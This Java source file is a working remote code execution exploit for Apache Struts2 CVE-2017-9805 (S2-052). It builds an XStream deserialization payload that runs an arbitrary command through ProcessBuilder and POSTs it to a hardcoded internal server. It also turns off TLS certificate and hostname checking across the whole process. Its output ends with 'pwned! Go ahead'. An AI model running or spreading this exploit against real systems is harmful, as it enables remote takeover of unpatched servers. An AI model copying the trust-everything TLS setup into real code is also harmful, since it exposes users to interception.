package org.cc.safe;
import org.cc.data.IOUtils;
import org.cc.data.TrustEverythingTrustManager;
import org.cc.data.VerifyEverythingHostnameVerifier;

import javax.net.ssl.HttpsURLConnection;
import javax.net.ssl.SSLContext;
import javax.net.ssl.TrustManager;
import java.io.IOException;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.net.HttpURLConnection;
import java.net.URL;
import java.security.KeyManagementException;
import java.security.NoSuchAlgorithmException;

public class CVE2017_9805Test {

    static {
        try {
            TrustManager[] trustManager = new TrustManager[]{new TrustEverythingTrustManager()};
            SSLContext sc = SSLContext.getInstance("TLS");
            sc.init(null, trustManager, new java.security.SecureRandom());
            HttpsURLConnection.setDefaultHostnameVerifier( new VerifyEverythingHostnameVerifier());
            HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());
            System.out.println(".... ok ");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void main(String[] items) throws IOException, InterruptedException {
        String[] args = new String[]{"https://10.10.4.83:8443/mndFront/loginCheck.action","dir"};
        //String[] args = new String[]{"http://localhost:9080/admin/","dir"};
        if (args.length > 0) {

            String targetUrl = args[0];
            String shell = shell(args[1]);
            System.out.println(targetUrl+":::"+shell);
            payload(targetUrl, shell );
            System.out.print(" [*] Starting exploit");
            for (int i = 0; i < 3; i++) {
                Thread.sleep(300);
                System.out.print(".");
            }
            System.out.print("\n [*] Sending payloads");
            for (int i = 0; i < 3; i++) {
                Thread.sleep(300);
                System.out.print(".");
            }
            System.out.print("\n [*] Payloads sent");
            for (int i = 0; i < 3; i++) {
                Thread.sleep(300);
                System.out.print(".");
            }
            System.out.print("\n [*] Opening shell");
            for (int i = 0; i < 3; i++) {
                Thread.sleep(300);
                System.out.print(".");
            }
            System.out.print("\n [*] pwned! Go ahead");
            for (int i = 0; i < 3; i++) {
                Thread.sleep(300);
                System.out.print(".");
            }
        } else {
            System.out.println(" [*] Apache Struts2 CVE-2017-9805 (S2-052) - Exploit");
            System.out.println(" [*] 0day Info:https://secfree.com/article-333.html");
            System.out.println(" [*] Use:        <targetUrl> <command>");
            System.out.println(" [*] Author:  www.secFree.com Team By Bearcat");
        }
    }

    public static int payload(String targetUrl, String command) throws IOException {
        HttpURLConnection uc = null;
        URL url;
        OutputStream out;
        int code=0;
        String payload = "<map> <entry> <jdk.nashorn.internal.objects.NativeString> <flags>0</flags> <value class='com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data'> <dataHandler> <dataSource class='com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource'> <is class='javax.crypto.CipherInputStream'> <cipher class='javax.crypto.NullCipher'> <initialized>false</initialized> <opmode>0</opmode> <serviceIterator class='javax.imageio.spi.FilterIterator'> <iter class='javax.imageio.spi.FilterIterator'> <iter class='java.util.Collections$EmptyIterator'/> <next class='java.lang.ProcessBuilder'> <command> "
                + command
                + " </command> <redirectErrorStream>false</redirectErrorStream> </next> </iter> <filter class='javax.imageio.ImageIO$ContainsFilter'> <method> <class>java.lang.ProcessBuilder</class> <name>start</name> <parameter-types/> </method> <name>foo</name> </filter> <next class='string'>foo</next> </serviceIterator> <lock/> </cipher> <input class='java.lang.ProcessBuilder$NullInputStream'/> <ibuffer></ibuffer> <done>false</done> <ostart>0</ostart> <ofinish>0</ofinish> <closed>false</closed> </is> <consumed>false</consumed> </dataSource> <transferFlavors/> </dataHandler> <dataLen>0</dataLen> </value> </jdk.nashorn.internal.objects.NativeString> <jdk.nashorn.internal.objects.NativeString reference='../jdk.nashorn.internal.objects.NativeString'/> </entry> <entry> <jdk.nashorn.internal.objects.NativeString reference='../../entry/jdk.nashorn.internal.objects.NativeString'/> <jdk.nashorn.internal.objects.NativeString reference='../../entry/jdk.nashorn.internal.objects.NativeString'/> </entry> </map>";
        System.out.println(payload);
        try {

            System.out.println(targetUrl);
            url = new URL(targetUrl);

            uc = (HttpURLConnection) url.openConnection();
            uc.setDoOutput(true);
            uc.setDoInput(true);
            uc.setRequestMethod("POST");
            uc.setRequestProperty("Accept", "application/xml");
            uc.setRequestProperty("Content-type", "application/xml ; charset=UTF-8 ");
            uc.connect();
            out =  uc.getOutputStream();
            out.write(payload.getBytes("UTF-8"));
            out.flush();
            out.close();
            code = uc.getResponseCode();
            if (code == 200) {
                System.out.println(new String(IOUtils.loadData(uc.getInputStream()),"UTF-8"));
            } else {
                System.out.println(new String(IOUtils.loadData(uc.getErrorStream()),"UTF-8"));
                 //IOUtils.loadData(uc.getErrorStream());
                //throw new Exception("http error : " + code);
            }

        } catch (Exception e) {
            e.printStackTrace();
        }
        uc.disconnect();
        return code;
    }

    public static String shell(String command) {
        String[] cmd = command.split(" ");
        command = "";
        for (int i = 0; i < cmd.length; i++) {
            command += "<string>" + cmd[i] + "</string>";
        }
        return command;
    }
}
